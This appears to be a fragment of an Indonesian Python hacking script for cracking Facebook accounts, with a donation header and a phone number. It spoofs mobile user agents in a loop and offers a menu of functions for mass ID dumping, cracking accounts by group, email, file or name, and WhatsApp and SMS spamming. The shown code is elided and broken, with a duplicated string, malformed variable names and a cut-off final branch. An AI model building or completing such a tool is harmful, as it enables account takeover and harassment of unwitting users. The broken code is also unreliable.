# [+] Update By RezkyXD And All
# [+] Script Free Jangan Di Perjual Belikan Ya
# [+] Donasi Untuk RezkyXD 
# [+] Dana : 085342925867
...
for xd in range(10000):
	...
	d='CPH1909 Build/O11019; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/ 371.0.0.10.104;]'AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/ 371.0.0.10.104;]
...
def menu(my_name,my_id):
	...
	_____Rezky___XD____ = input(f' [+] Pilih Menu Crack : ')
	if _____Rezky___XD____ in ['1','01']:
		brayen_dump()
	elif _____Rezky___XD____ in ['2','02']:
		dump_massal()
	elif _____Rezky___XD____ in ['3','03']:
		crack_group()
	elif _____Rezky___XD____ in ['4','04']:
		crack_email()
	elif _____Rezky___XD____ in ['5','05']:
		crack_file()
	elif _____Rezky___XD____ in ['6','06']:
		crack_nama()
	elif _____Rezky___XD____ in ['7','07']:
		pengikut()
	elif _____Rezky___XD____ in ['8','08']:
		komen()
	elif _____Rezky___XD____ in ['9','09']:
		file_cp()
	elif _____Rezky___XD____ in ['10']:
		result()
	elif _____Rezky___XD____ in ['11']:
		siu()
	elif _____ Rezky___XD____ in ['12']:
		spam_wa()
	elif _____ Rezky___XD____ in ['13']:
		spam_sms()
	elif _____Rezky___XD____ in ['14']:
		dumpid()
	elif _____Rezky___XD____ in ['15']:
